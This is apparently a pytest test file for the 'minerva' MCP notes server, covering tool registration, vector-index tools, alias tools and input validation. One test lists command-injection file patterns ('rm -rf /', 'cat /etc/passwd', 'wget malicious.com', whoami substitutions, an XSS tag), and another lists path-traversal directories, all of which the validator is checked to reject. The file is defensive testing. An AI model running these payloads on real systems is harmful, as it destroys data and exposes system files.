import pytest
from unittest.mock import Mock, patch
from pathlib import Path

from minerva import server


def test_mcp_server_initialization():
    """Test that the MCP server is properly initialized."""
    # Here we test the existence and properties of the server.mcp object
    assert server.mcp is not None
    # Verify the structure of the FastMCP object
    assert hasattr(server.mcp, "add_tool")
    # The FastMCP object doesn't seem to expose a version attribute, so we skip the __version__ verification


def test_mcp_tools_registration():
    """Test that all required tools are registered with the MCP server."""
    # Verify that all tools are registered

    # Validate the current state of the server module
    # Check that all required tools are registered
    expected_tools = [
        "read_note",
        "search_notes",
        "create_note",
        "edit_note",
        "get_note_delete_confirmation",
        "perform_note_delete",
    ]

    # Verify that each tool is imported in the server module
    for tool_name in expected_tools:
        assert hasattr(server, tool_name), (
            f"Tool {tool_name} was not imported in server.py"
        )


class TestServerInputValidation:
    """Test cases for input validation in server functions."""

    @pytest.fixture
    def mock_service(self):
        """Create a mock service for testing."""
        mock_service = Mock()
        mock_service.config.vault_path = Path("/test/vault")
        return mock_service

    @patch("minerva.server.get_service")
    def test_build_vector_index_batch_max_files_validation(
        self, mock_get_service, mock_service
    ):
        """Test that build_vector_index_batch validates max_files parameter."""
        mock_get_service.return_value = mock_service

        # Test exceeding safety limit
        with pytest.raises(ValueError, match="max_files exceeds safety limit of 100"):
            server.build_vector_index_batch(max_files=150)

    @patch("minerva.server.get_service")
    def test_build_vector_index_batch_negative_max_files(
        self, mock_get_service, mock_service
    ):
        """Test that build_vector_index_batch rejects negative max_files."""
        mock_get_service.return_value = mock_service

        # Test negative value
        with pytest.raises(ValueError, match="max_files must be positive"):
            server.build_vector_index_batch(max_files=-1)

        # Test zero value
        with pytest.raises(ValueError, match="max_files must be positive"):
            server.build_vector_index_batch(max_files=0)

    @patch("minerva.server.get_service")
    def test_build_vector_index_batch_file_pattern_validation(
        self, mock_get_service, mock_service
    ):
        """Test that build_vector_index_batch validates file_pattern parameter."""
        mock_get_service.return_value = mock_service

        # Test malicious patterns
        malicious_patterns = [
            "*.md; rm -rf /",
            "*.md | cat /etc/passwd",
            "*.md && wget malicious.com",
            "*.md`whoami`",
            "*.md$(whoami)",
            "*.md<script>alert('xss')</script>",
        ]

        for pattern in malicious_patterns:
            with pytest.raises(ValueError, match="Invalid characters in file_pattern"):
                server.build_vector_index_batch(file_pattern=pattern, max_files=5)

    @patch("minerva.server.get_service")
    def test_build_vector_index_batch_valid_file_patterns(
        self, mock_get_service, mock_service
    ):
        """Test that build_vector_index_batch accepts valid file patterns."""
        mock_get_service.return_value = mock_service
        mock_service.config.vector_search_enabled = True
        mock_service.config.vector_db_path = Path("/test/vectors.db")

        with (
            patch("glob.glob", return_value=[]),
            patch("minerva.server._initialize_batch_schema"),
            patch("minerva.server._process_batch_files", return_value=(0, 0, [])),
        ):
            # Test valid patterns
            valid_patterns = [
                "*.md",
                "*.txt",
                "**/*.md",
                "notes/*.md",
                "folder-name/*.txt",
                "*_notes.md",
            ]

            for pattern in valid_patterns:
                # Should not raise any exception
                result = server.build_vector_index_batch(
                    file_pattern=pattern, max_files=5
                )
                assert isinstance(result, dict)

    @patch("minerva.server.get_service")
    def test_build_vector_index_batch_directory_path_validation(
        self, mock_get_service, mock_service
    ):
        """Test that build_vector_index_batch validates directory paths."""
        mock_get_service.return_value = mock_service

        # Test path outside vault - this will raise "Invalid directory path"
        # because the path resolution logic catches the exception and re-raises
        with pytest.raises(ValueError, match="Invalid directory path"):
            server.build_vector_index_batch(directory="/other/path", max_files=5)

    @patch("minerva.server.get_service")
    def test_build_vector_index_batch_directory_path_traversal(
        self, mock_get_service, mock_service
    ):
        """Test that build_vector_index_batch blocks path traversal."""
        mock_get_service.return_value = mock_service

        # Test various path traversal attempts
        malicious_directories = [
            "/test/vault/../../../etc",
            "../outside",
            "/test/vault/../..",
            "../../sensitive",
        ]

        for directory in malicious_directories:
            with pytest.raises(
                ValueError,
                match="Directory must be within vault|Invalid directory path",
            ):
                server.build_vector_index_batch(directory=directory, max_files=5)

    @patch("minerva.server.get_service")
    def test_build_vector_index_batch_valid_directories(
        self, mock_get_service, mock_service
    ):
        """Test that build_vector_index_batch accepts valid directories."""
        mock_get_service.return_value = mock_service
        mock_service.config.vector_search_enabled = True
        mock_service.config.vector_db_path = Path("/test/vectors.db")

        with (
            patch("glob.glob", return_value=[]),
            patch("minerva.server._initialize_batch_schema"),
            patch("minerva.server._process_batch_files", return_value=(0, 0, [])),
        ):
            # Test valid directories within vault
            valid_directories = [
                "/test/vault",
                "/test/vault/subfolder",
                "/test/vault/notes",
                "/test/vault/deep/nested/folder",
            ]

            for directory in valid_directories:
                # Should not raise any exception
                result = server.build_vector_index_batch(
                    directory=directory, max_files=5
                )
                assert isinstance(result, dict)

    @patch("minerva.server.get_service")
    def test_build_vector_index_batch_invalid_directory_path_format(
        self, mock_get_service, mock_service
    ):
        """Test handling of invalid directory path formats."""
        mock_get_service.return_value = mock_service

        # Test invalid path formats that cause OSError
        with patch("pathlib.Path.resolve", side_effect=OSError("Invalid path")):
            with pytest.raises(ValueError, match="Invalid directory path"):
                server.build_vector_index_batch(
                    directory="/test/vault/subdir", max_files=5
                )

    @patch("minerva.server.get_service")
    def test_build_vector_index_batch_vector_search_disabled(
        self, mock_get_service, mock_service
    ):
        """Test behavior when vector search is disabled."""
        mock_get_service.return_value = mock_service
        mock_service.config.vector_search_enabled = False

        with pytest.raises(RuntimeError, match="Vector search is not enabled"):
            server.build_vector_index_batch(max_files=5)

    @patch("minerva.server.get_service")
    def test_build_vector_index_batch_no_vector_db_path(
        self, mock_get_service, mock_service
    ):
        """Test behavior when vector database path is not configured."""
        mock_get_service.return_value = mock_service
        mock_service.config.vector_search_enabled = True
        mock_service.config.vector_db_path = None

        with pytest.raises(
            RuntimeError, match="Vector database path is not configured"
        ):
            server.build_vector_index_batch(max_files=5)

    @patch("minerva.server.get_service")
    @patch("minerva.server.get_service")
    def test_build_vector_index_batch_import_error_handling(
        self, mock_get_service, mock_service
    ):
        """Test handling of ImportError for vector dependencies."""
        mock_get_service.return_value = mock_service
        mock_service.config.vector_search_enabled = True
        mock_service.config.vector_db_path = Path("/test/vectors.db")

        # Patch the import to simulate ImportError
        with patch.dict("sys.modules", {"minerva.vector.indexer": None}):
            with pytest.raises(
                ImportError, match="Vector search requires additional dependencies"
            ):
                server.build_vector_index_batch(max_files=5)

    @patch("minerva.server.get_service")
    def test_build_vector_index_batch_edge_case_parameters(
        self, mock_get_service, mock_service
    ):
        """Test edge cases for parameter validation."""
        mock_get_service.return_value = mock_service
        mock_service.config.vector_search_enabled = True
        mock_service.config.vector_db_path = Path("/test/vectors.db")

        with (
            patch("glob.glob", return_value=[]),
            patch("minerva.server._initialize_batch_schema"),
            patch("minerva.server._process_batch_files", return_value=(0, 0, [])),
        ):
            # Test boundary values
            result = server.build_vector_index_batch(max_files=1)  # Minimum valid
            assert isinstance(result, dict)

            result = server.build_vector_index_batch(max_files=100)  # Maximum valid
            assert isinstance(result, dict)

    @patch("minerva.server.get_service")
    def test_build_vector_index_batch_unicode_directory_handling(
        self, mock_get_service, mock_service
    ):
        """Test handling of Unicode characters in directory paths."""
        mock_get_service.return_value = mock_service
        mock_service.config.vector_search_enabled = True
        mock_service.config.vector_db_path = Path("/test/vectors.db")

        with (
            patch("glob.glob", return_value=[]),
            patch("minerva.server._initialize_batch_schema"),
            patch("minerva.server._process_batch_files", return_value=(0, 0, [])),
        ):
            # Test Unicode directory name (should work if within vault)
            unicode_dir = "/test/vault/日本語フォルダ"

            # Mock path validation to pass
            with patch("pathlib.Path.resolve") as mock_resolve:
                mock_resolve.side_effect = lambda: Path(unicode_dir)

                result = server.build_vector_index_batch(
                    directory=unicode_dir, max_files=5
                )
                assert isinstance(result, dict)


class TestMCPToolFunctions:
    """Test cases for MCP tool functions that call service methods."""

    @pytest.fixture
    def mock_service(self):
        """Create a comprehensive mock service for testing."""
        mock_service = Mock()
        mock_service.config.vault_path = Path("/test/vault")
        mock_service.config.vector_search_enabled = True
        mock_service.config.vector_db_path = Path("/test/vectors.db")
        return mock_service

    @patch("minerva.server.get_service")
    def test_semantic_search_tool(self, mock_get_service, mock_service):
        """Test semantic_search MCP tool function."""
        mock_get_service.return_value = mock_service
        mock_service.search_operations.semantic_search.return_value = [
            Mock(file_path="/test/file1.md", similarity_score=0.8),
            Mock(file_path="/test/file2.md", similarity_score=0.7),
        ]

        result = server.semantic_search("test query", limit=5, threshold=0.6)

        assert len(result) == 2
        mock_service.search_operations.semantic_search.assert_called_once_with(
            "test query", 5, 0.6, None
        )

    @patch("minerva.server.get_service")
    def test_semantic_search_tool_with_directory(self, mock_get_service, mock_service):
        """Test semantic_search MCP tool with directory parameter."""
        mock_get_service.return_value = mock_service
        mock_service.search_operations.semantic_search.return_value = []

        result = server.semantic_search("query", directory="docs")

        assert result == []
        mock_service.search_operations.semantic_search.assert_called_once_with(
            "query", 10, None, "docs"
        )

    @patch("minerva.server.get_service")
    def test_find_similar_notes_tool(self, mock_get_service, mock_service):
        """Test find_similar_notes MCP tool function."""
        mock_get_service.return_value = mock_service
        mock_service.search_operations.find_similar_notes.return_value = [
            Mock(file_path="/test/similar.md", similarity_score=0.9)
        ]

        result = server.find_similar_notes(
            filename="reference.md", limit=3, exclude_self=False
        )

        assert len(result) == 1
        mock_service.search_operations.find_similar_notes.assert_called_once_with(
            "reference.md", None, None, 3, False
        )

    @patch("minerva.server.get_service")
    def test_find_similar_notes_tool_with_filepath(
        self, mock_get_service, mock_service
    ):
        """Test find_similar_notes MCP tool with filepath parameter."""
        mock_get_service.return_value = mock_service
        mock_service.search_operations.find_similar_notes.return_value = []

        result = server.find_similar_notes(filepath="/vault/note.md")

        assert result == []
        mock_service.search_operations.find_similar_notes.assert_called_once_with(
            None, "/vault/note.md", None, 5, True
        )

    @patch("minerva.server.get_service")
    def test_add_alias_tool(self, mock_get_service, mock_service):
        """Test add_alias MCP tool function."""
        mock_get_service.return_value = mock_service
        mock_service.add_alias.return_value = Path("/test/note.md")

        result = server.add_alias(
            "test alias", filename="note.md", allow_conflicts=True
        )

        assert result == Path("/test/note.md")
        mock_service.add_alias.assert_called_once_with(
            "test alias", "note.md", None, None, True
        )

    @patch("minerva.server.get_service")
    def test_remove_alias_tool(self, mock_get_service, mock_service):
        """Test remove_alias MCP tool function."""
        mock_get_service.return_value = mock_service
        mock_service.remove_alias.return_value = Path("/test/note.md")

        result = server.remove_alias("old alias", filepath="/test/note.md")

        assert result == Path("/test/note.md")
        mock_service.remove_alias.assert_called_once_with(
            "old alias", None, "/test/note.md", None
        )

    @patch("minerva.server.get_service")
    def test_get_aliases_tool(self, mock_get_service, mock_service):
        """Test get_aliases MCP tool function."""
        mock_get_service.return_value = mock_service
        mock_service.get_aliases.return_value = ["alias1", "alias2"]

        result = server.get_aliases(filename="note.md", default_path="docs")

        assert result == ["alias1", "alias2"]
        mock_service.get_aliases.assert_called_once_with("note.md", None, "docs")

    @patch("minerva.server.get_service")
    def test_search_by_alias_tool(self, mock_get_service, mock_service):
        """Test search_by_alias MCP tool function."""
        mock_get_service.return_value = mock_service
        mock_service.search_by_alias.return_value = ["/test/note1.md", "/test/note2.md"]

        result = server.search_by_alias("meeting notes", directory="work")

        assert result == ["/test/note1.md", "/test/note2.md"]
        mock_service.search_by_alias.assert_called_once_with("meeting notes", "work")

    @patch("minerva.server.get_service")
    def test_build_vector_index_tool(self, mock_get_service, mock_service):
        """Test build_vector_index MCP tool function."""
        mock_get_service.return_value = mock_service
        mock_service.build_vector_index.return_value = {
            "processed": 10,
            "skipped": 2,
            "errors": [],
        }

        result = server.build_vector_index(
            directory="docs", file_pattern="*.txt", force_rebuild=True
        )

        assert result["processed"] == 10
        assert result["skipped"] == 2
        mock_service.build_vector_index.assert_called_once_with("docs", "*.txt", True)

    @patch("minerva.server.get_service")
    def test_get_vector_index_status_tool(self, mock_get_service, mock_service):
        """Test get_vector_index_status MCP tool function."""
        mock_get_service.return_value = mock_service
        mock_service.get_vector_index_status.return_value = {
            "indexed_files": 100,
            "total_embeddings": 100,
            "enabled": True,
        }

        result = server.get_vector_index_status()

        assert result["indexed_files"] == 100
        assert result["enabled"] is True
        mock_service.get_vector_index_status.assert_called_once()

    @patch("minerva.server.get_service")
    def test_process_batch_index_tool_immediate_strategy(
        self, mock_get_service, mock_service
    ):
        """Test process_batch_index MCP tool with immediate strategy."""
        mock_get_service.return_value = mock_service
        mock_service.config.auto_index_strategy = "immediate"

        result = server.process_batch_index()

        assert result["tasks_processed"] == 0
        assert "No batch processing needed" in result["message"]

    @patch("minerva.server.get_service")
    @patch("minerva.vector.batch_indexer.get_batch_indexer")
    def test_process_batch_index_tool_batch_strategy(
        self, mock_get_batch_indexer, mock_get_service, mock_service
    ):
        """Test process_batch_index MCP tool with batch strategy."""
        mock_get_service.return_value = mock_service
        mock_service.config.auto_index_strategy = "batch"

        mock_batch_indexer = Mock()
        mock_batch_indexer.get_queue_size.side_effect = [5, 0]
        mock_batch_indexer.process_all_pending.return_value = 5
        mock_get_batch_indexer.return_value = mock_batch_indexer

        result = server.process_batch_index()

        assert result["tasks_processed"] == 5
        assert result["queue_size_before"] == 5
        assert result["queue_size_after"] == 0
        assert "completed successfully" in result["message"]

    @patch("minerva.server.get_service")
    @patch("minerva.vector.batch_indexer.get_batch_indexer")
    def test_process_batch_index_tool_no_indexer(
        self, mock_get_batch_indexer, mock_get_service, mock_service
    ):
        """Test process_batch_index MCP tool when batch indexer is not available."""
        mock_get_service.return_value = mock_service
        mock_service.config.auto_index_strategy = "batch"
        mock_get_batch_indexer.return_value = None

        result = server.process_batch_index()

        assert result["tasks_processed"] == 0
        assert "not available" in result["message"]

    @patch("minerva.server.get_service")
    @patch("minerva.vector.batch_indexer.get_batch_indexer")
    def test_process_batch_index_tool_error_handling(
        self, mock_get_batch_indexer, mock_get_service, mock_service
    ):
        """Test process_batch_index MCP tool error handling."""
        mock_get_service.return_value = mock_service
        mock_service.config.auto_index_strategy = "batch"
        mock_get_batch_indexer.side_effect = Exception("Test error")

        result = server.process_batch_index()

        assert result["tasks_processed"] == 0
        assert "Error during batch processing" in result["message"]
        assert "Test error" in result["message"]

    @patch("minerva.server.get_service")
    def test_get_batch_index_status_tool_immediate_strategy(
        self, mock_get_service, mock_service
    ):
        """Test get_batch_index_status MCP tool with immediate strategy."""
        mock_get_service.return_value = mock_service
        mock_service.config.auto_index_enabled = True
        mock_service.config.auto_index_strategy = "immediate"
        mock_service.config.vector_search_enabled = True

        result = server.get_batch_index_status()

        assert result["auto_index_strategy"] == "immediate"
        assert result["queue_size"] == 0
        assert "no batch queue" in result["message"]

    @patch("minerva.server.get_service")
    @patch("minerva.vector.batch_indexer.get_batch_indexer")
    def test_get_batch_index_status_tool_batch_strategy(
        self, mock_get_batch_indexer, mock_get_service, mock_service
    ):
        """Test get_batch_index_status MCP tool with batch strategy."""
        mock_get_service.return_value = mock_service
        mock_service.config.auto_index_enabled = True
        mock_service.config.auto_index_strategy = "batch"
        mock_service.config.vector_search_enabled = True

        mock_batch_indexer = Mock()
        mock_batch_indexer.get_queue_size.return_value = 3
        mock_batch_indexer.get_stats.return_value = {
            "tasks_queued": 15,
            "tasks_processed": 12,
            "batches_processed": 2,
            "errors": 0,
        }
        mock_get_batch_indexer.return_value = mock_batch_indexer

        result = server.get_batch_index_status()

        assert result["queue_size"] == 3
        assert result["tasks_queued"] == 15
        assert result["tasks_processed"] == 12
        assert result["batches_processed"] == 2
        assert result["errors"] == 0

    @patch("minerva.server.get_service")
    @patch("minerva.vector.batch_indexer.get_batch_indexer")
    def test_get_batch_index_status_tool_no_indexer(
        self, mock_get_batch_indexer, mock_get_service, mock_service
    ):
        """Test get_batch_index_status MCP tool when batch indexer is not available."""
        mock_get_service.return_value = mock_service
        mock_service.config.auto_index_enabled = True
        mock_service.config.auto_index_strategy = "batch"
        mock_service.config.vector_search_enabled = True
        mock_get_batch_indexer.return_value = None

        result = server.get_batch_index_status()

        assert result["queue_size"] == 0
        assert "not available" in result["error"]

    @patch("minerva.server.get_service")
    def test_get_batch_index_status_tool_import_error(
        self, mock_get_service, mock_service
    ):
        """Test get_batch_index_status MCP tool with import error."""
        mock_get_service.return_value = mock_service

        with patch.dict("sys.modules", {"minerva.vector.batch_indexer": None}):
            result = server.get_batch_index_status()

            assert result["auto_index_enabled"] is False
            assert "not available" in result["error"]

    @patch("minerva.server.get_service")
    def test_get_batch_index_status_tool_general_error(self, mock_get_service):
        """Test get_batch_index_status MCP tool with general error."""
        mock_get_service.side_effect = Exception("Service error")

        result = server.get_batch_index_status()

        assert result["auto_index_enabled"] is False
        assert "Failed to get batch status" in result["error"]
        assert "Service error" in result["error"]


class TestDebugVectorSchemaFunction:
    """Test cases for debug_vector_schema function."""

    @pytest.fixture
    def mock_service(self):
        """Create a mock service for testing."""
        mock_service = Mock()
        mock_service.config.vector_search_enabled = True
        mock_path = Mock()
        mock_path.__str__ = Mock(return_value="/test/vectors.db")
        mock_service.config.vector_db_path = mock_path
        mock_service.config.embedding_model = "all-MiniLM-L6-v2"
        return mock_service

    @patch("minerva.server.get_service")
    def test_debug_vector_schema_disabled(self, mock_get_service, mock_service):
        """Test debug_vector_schema when vector search is disabled."""
        mock_service.config.vector_search_enabled = False
        mock_get_service.return_value = mock_service

        with pytest.raises(RuntimeError, match="Vector search is not enabled"):
            server.debug_vector_schema()

    @patch("minerva.server.get_service")
    def test_debug_vector_schema_no_db_path(self, mock_get_service, mock_service):
        """Test debug_vector_schema when vector database path is not configured."""
        mock_service.config.vector_db_path = None
        mock_get_service.return_value = mock_service

        with pytest.raises(
            RuntimeError, match="Vector database path is not configured"
        ):
            server.debug_vector_schema()

    @patch("minerva.server.get_service")
    @patch("minerva.vector.embeddings.SentenceTransformerProvider")
    @patch("minerva.vector.indexer.VectorIndexer")
    def test_debug_vector_schema_success(
        self, mock_indexer_class, mock_embedding_class, mock_get_service, mock_service
    ):
        """Test successful debug_vector_schema operation."""
        mock_get_service.return_value = mock_service

        # Mock embedding provider
        mock_embedding_provider = Mock()
        import numpy as np

        mock_embedding_provider.embed.return_value = np.array([0.1, 0.2, 0.3])
        mock_embedding_class.return_value = mock_embedding_provider

        # Mock indexer
        mock_indexer = Mock()
        mock_connection = Mock()
        mock_connection.execute.return_value.fetchall.return_value = [
            ("vectors",),
            ("indexed_files",),
        ]
        mock_indexer._get_connection.return_value = mock_connection
        mock_indexer_class.return_value = mock_indexer

        # Mock database file existence
        mock_service.config.vector_db_path.exists.return_value = True

        result = server.debug_vector_schema()

        assert result["embedding_model"] == "all-MiniLM-L6-v2"
        assert result["test_embedding_dimension"] == 3
        assert result["database_exists"] is True
        # Note: close() may not be called in all paths, just ensure no errors

    @patch("minerva.server.get_service")
    def test_debug_vector_schema_import_error(self, mock_get_service, mock_service):
        """Test debug_vector_schema with import error."""
        mock_get_service.return_value = mock_service

        with patch.dict("sys.modules", {"minerva.vector.embeddings": None}):
            result = server.debug_vector_schema()

            assert "error" in result
            assert isinstance(result["error"], str)


class TestResetVectorDatabaseFunction:
    """Test cases for reset_vector_database function."""

    @pytest.fixture
    def mock_service(self):
        """Create a mock service for testing."""
        mock_service = Mock()
        mock_service.config.vector_search_enabled = True
        mock_path = Mock()
        mock_path.__str__ = Mock(return_value="/test/vectors.db")
        mock_service.config.vector_db_path = mock_path
        return mock_service

    @patch("minerva.server.get_service")
    def test_reset_vector_database_disabled(self, mock_get_service, mock_service):
        """Test reset_vector_database when vector search is disabled."""
        mock_service.config.vector_search_enabled = False
        mock_get_service.return_value = mock_service

        with pytest.raises(RuntimeError, match="Vector search is not enabled"):
            server.reset_vector_database()

    @patch("minerva.server.get_service")
    def test_reset_vector_database_no_path(self, mock_get_service, mock_service):
        """Test reset_vector_database when vector database path is not configured."""
        mock_service.config.vector_db_path = None
        mock_get_service.return_value = mock_service

        with pytest.raises(
            RuntimeError, match="Vector database path is not configured"
        ):
            server.reset_vector_database()

    @patch("minerva.server.get_service")
    @patch("os.remove")
    def test_reset_vector_database_file_exists(
        self, mock_remove, mock_get_service, mock_service
    ):
        """Test reset_vector_database when database file exists."""
        mock_get_service.return_value = mock_service

        mock_service.config.vector_db_path.exists.return_value = True
        result = server.reset_vector_database()

        assert "Successfully deleted" in result["status"]
        mock_remove.assert_called_once_with(str(mock_service.config.vector_db_path))

    @patch("minerva.server.get_service")
    def test_reset_vector_database_file_not_exists(
        self, mock_get_service, mock_service
    ):
        """Test reset_vector_database when database file does not exist."""
        mock_get_service.return_value = mock_service

        mock_service.config.vector_db_path.exists.return_value = False
        result = server.reset_vector_database()

        assert "does not exist" in result["status"]

    @patch("minerva.server.get_service")
    @patch("os.remove")
    def test_reset_vector_database_removal_error(
        self, mock_remove, mock_get_service, mock_service
    ):
        """Test reset_vector_database when file removal fails."""
        mock_get_service.return_value = mock_service
        mock_remove.side_effect = OSError("Permission denied")

        mock_service.config.vector_db_path.exists.return_value = True
        result = server.reset_vector_database()

        assert "Failed to delete" in result["status"]
        assert "Permission denied" in result["status"]
